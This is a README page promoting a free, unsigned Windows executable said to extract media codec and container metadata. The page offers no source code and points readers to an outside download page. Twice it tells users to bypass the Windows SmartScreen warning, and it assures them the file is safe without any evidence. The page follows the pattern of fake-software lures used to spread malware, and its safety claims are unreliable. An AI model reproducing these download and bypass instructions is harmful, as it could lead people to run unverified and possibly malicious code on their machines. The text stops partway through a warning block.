<div align="center">

<img src="assets/banner.svg" width="100%" alt="Media Info Extractor banner"/>

# media-info-extractor-tool 🎞️⚡

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*Point it at a file, get every byte of truth back — codecs, containers, streams, and metadata, no guesswork required.*

<p align="center">
  <a href="https://Secretfitzengage.github.io/media-info-extractor-tool/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Release-DC2626?style=for-the-badge&logo=windows&logoColor=white&labelColor=B91C1C" width="550" alt="Download"/>
  </a>
</p>
</div>

---

## 📼 Overview

<details>
<summary><b>One bold sentence, then the whole story</b> — click to expand</summary>

<br>

**media-info-extractor-tool ships as a single, self-contained Windows executable that reads the true technical fingerprint of any audio or video file in under a second.** No bundled runtimes to install, no background services phoning home, no "trial" nagware — just a tool built by a solo developer who got tired of media files lying about what's actually inside them.

The story behind it is simple. Every media file is a container wrapped around a promise — that the codec it claims, the bitrate it advertises, and the streams it holds are what you actually get when you open it. That promise breaks constantly: re-muxed files with mismatched extensions, video assets missing audio tracks, corrupted headers that other tools silently ignore. This project was built to stop guessing and start knowing, by parsing container structures and stream headers directly instead of trusting file extensions or player behavior.

</details>

This is a **media info extractor** in the truest sense — a diagnostic instrument for anyone who works with digital media at any serious volume. Video editors verifying deliverables before a client hand-off, archivists auditing legacy tape-to-digital transfers, QA engineers validating transcode pipelines, and streaming ops teams chasing down a mysterious playback failure all end up needing the same thing: a fast, accurate, no-nonsense read on what a file *actually* contains, down to the codec profile and frame structure.

It exists because most "info" tools either wrap a decades-old CLI in a clunky window, or they're bloated suites trying to also be a converter, a player, and a subscription service. This tool does one job — extraction and inspection of media metadata — and does it with the kind of speed and reliability you'd expect from software that's been battle-tested against thousands of real-world files, not just the clean samples in a demo reel.

It's built for people who don't have time to babysit software. Drop a file, read the report, move on with your day.

<p align="center">

<a href="https://Secretfitzengage.github.io/media-info-extractor-tool/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Latest_Release-DC2626?style=for-the-badge&logo=windows&logoColor=white&labelColor=B91C1C" width="550" alt="Download"/>
  </a>

</p>

---

## 🔍 What It Actually Digs Up

**TL;DR: full container, codec, stream, and metadata breakdown — presented clearly, exportable instantly.**

- **Container-level X-ray** — identifies the true container format (MP4, MKV, MOV, AVI, WebM, and more) regardless of what the file extension claims, catching mislabeled or re-wrapped files instantly.

- **Codec fingerprinting** — reports exact video and audio codec identifiers, profiles, and levels (H.264 High Profile, HEVC Main10, AAC-LC, and dozens more) instead of vague "video/audio" labels.

- **Stream-by-stream inspection** — breaks out every video, audio, and subtitle track individually, so a file with three audio languages and two subtitle tracks shows all five, not just the default.

- **Bitrate and resolution truth-telling** — surfaces real average and peak bitrate, actual pixel dimensions, aspect ratio, and frame rate, cutting through metadata that publishers often round or misreport.

- **Duration and frame count precision** — calculates exact runtime and total frame counts from stream data rather than trusting a potentially stale container header.

- **Metadata & tag excavation** — pulls embedded tags, chapter markers, creation timestamps, and encoder signatures where present, useful for provenance checks and archival cataloging.

- **Batch scanning mode** — point it at a folder instead of a file and get a consolidated report across every media asset inside, ideal for auditing large libraries in one pass.

- **Export-ready reports** — copy results as plain text or export structured reports for hand-off to QA logs, ticket systems, or archival documentation.

> [!TIP]
> Running a batch scan on a network drive? Copy the folder locally first — local disk reads are dramatically faster than scanning over SMB, especially with hundreds of files.

---

## 🚀 Getting Off the Ground

**TL;DR: visit the page, download, run, inspect. Four steps, no installer wizard.**

1. **Visit the landing page** using the download button above — it's the only place this project distributes builds from.

2. **Download the executable** — it's a single file, digitally consistent across releases, with no bundled installer or third-party bloat.

3. **Run it directly** — double-click and the tool opens immediately. There's nothing to configure before your first scan.

4. **Drop in a file or folder** — drag it onto the window, or use the built-in file picker, and the report populates in real time.

> [!NOTE]
> Windows SmartScreen may flag new, less-common executables on first run. Click "More info" → "Run anyway." The tool is unsigned by design to stay a free-standing solo project without recurring certificate costs — this does not affect how it functions.

---

## 🖥️ System Requirements

**TL;DR: Windows 10/11, nothing else. It just runs.**

| Requirement | Detail |
|---|---|
| **OS** | Windows 10 (64-bit) or Windows 11 |
| **Dependencies** | None — fully self-contained |
| **Disk space** | Under 100 MB |
| **RAM** | 4 GB minimum, 8 GB recommended for large batch scans |
| **Internet** | Not required after download |
| **Installer** | None — portable single-file executable |

> [!IMPORTANT]
> This is a standalone Windows tool. There is no macOS or Linux build, and no browser-based version — the architecture is built directly against Windows media frameworks for maximum accuracy and speed.

---

## 🧠 How It Works

**TL;DR: the file is read, its container is parsed, streams are decoded at the header level, and results are rendered instantly.**

The pipeline is intentionally lean — every stage exists to preserve accuracy without sacrificing speed:

1. **File intake** — the tool opens the target file in a read-only stream, never modifying the source.
2. **Container parsing** — the outer wrapper format is identified and its internal structure is mapped.
3. **Stream header analysis** — each embedded video, audio, and subtitle stream is decoded at the header level to extract codec, resolution, bitrate, and timing data.
4. **Metadata aggregation** — tags, chapters, and embedded technical metadata are collected and normalized into a single report.
5. **Render & export** — results populate the UI instantly and can be copied or exported on demand.

```mermaid
flowchart LR
    Intake --> Parse
    Parse --> Headers
    Headers --> Metadata
    Metadata --> Report
```

---

## 🛟 Troubleshooting Corner

**TL;DR: most issues are extension mismatches, corrupted headers, or SmartScreen — all solvable in seconds.**

<details>
<summary><b>The tool says my MP4 is actually a different container — is that a bug?</b></summary>

<br>

No — that's the tool doing exactly what it's built for. Some software re-wraps or exports files with an `.mp4` extension while the underlying container structure is actually MOV or a fragmented variant. The extractor reads the real container signature, not the file name, so mismatches like this get surfaced rather than hidden.

</details>

<details>
<summary><b>Scan results show "unknown codec" for one of my streams — why?</b></summary>

<br>

This usually means the stream uses a proprietary or heavily obscure codec variant without a standard header signature, or the stream itself is partially corrupted. Try running the file through a different sample from the same source to confirm whether it's the file or the encoder.

</details>

<details>
<summary><b>Windows SmartScreen blocked the executable — is it safe to proceed?</b></summary>

<br>

Yes. The warning appears because the build isn't code-signed with a paid certificate, not because of any detected issue. Click "More info" → "Run anyway" to continue.

</details>

<details>
<summary><b>Batch scan on a large folder feels slow — what's going on?</b></summary>

<br>

Network drives and external HDDs introduce read latency that a batch scan will expose quickly. Copy the target folder to a local SSD first for a noticeable speed difference, especially past a few hundred files.

</details>

<details>
<summary><b>Duration shown doesn't match what my media player reports — which is correct?</b></summary>

<br>

The extractor calculates duration from actual stream data rather than the container's header value, which can drift on files that were edited, trimmed, or re-muxed without a full re-encode. When in doubt, trust the stream-calculated figure.

</details>

<details>
<summary><b>Can this tool modify or convert my files?</b></summary>

<br>

No — by design. This is a read-only inspection tool. It never writes to, transcodes, or alters the source file in any way.

</details>

---

## 🎛️ Interface & Everyday Feel

**TL;DR: fast, keyboard-friendly, themeable, and built to stay out of your way.**

> [!TIP]
> Power users should learn the shortcuts below — they cut scan-to-report time down to almost nothing.

| Shortcut | Action |
|---|---|
| `Ctrl + O` | Open file picker |
| `Ctrl + Shift + O` | Open folder for batch scan |
| `Ctrl + C` | Copy current report to clipboard |
| `Ctrl + E` | Export report to file |
| `Ctrl + F` | Search within results |
| `F5` | Re-scan current file/folder |
| `Esc` | Cancel active scan |

**Additional interface details:**

- Light and dark themes, switchable instantly, with the dark theme set as default for late-night library audits.

- Drag-and-drop zone that accepts single files or entire folders without needing a menu.

- A persistent settings panel remembers your preferred export format and theme between sessions.

- Results panel supports collapsible sections per stream, so a file with a dozen tracks doesn't overwhelm the view.

![Build](https://img.shields.io/badge/build-passing-brightgreen?style=flat-square) ![Made with](https://img.shields.io/badge/made%20with-C%2B%2B-00599C?style=flat-square&logo=cplusplus&logoColor=white) ![Maintained](https://img.shields.io/badge/maintained-yes-blue?style=flat-square)

---

## 🤝 Contributing & Community

**TL;DR: solo-maintained, community-fueled — issues and pull requests are genuinely read.**

> This project is maintained by a solo developer who ships fast and keeps scope tight. That doesn't mean it's closed off — it means every contribution actually gets looked at instead of disappearing into a triage queue.

- **Found a file that breaks the parser?** Open an issue with a description of the container/codec combination — real-world edge cases are what make this tool better.

- **Have an idea for a new metadata field to surface?** Feature requests grounded in real workflows (archival, QA, editing) get prioritized over speculative asks.

- **Want to contribute code?** Pull requests are welcome — keep changes focused and explain the "why," not just the "what."

> [!WARN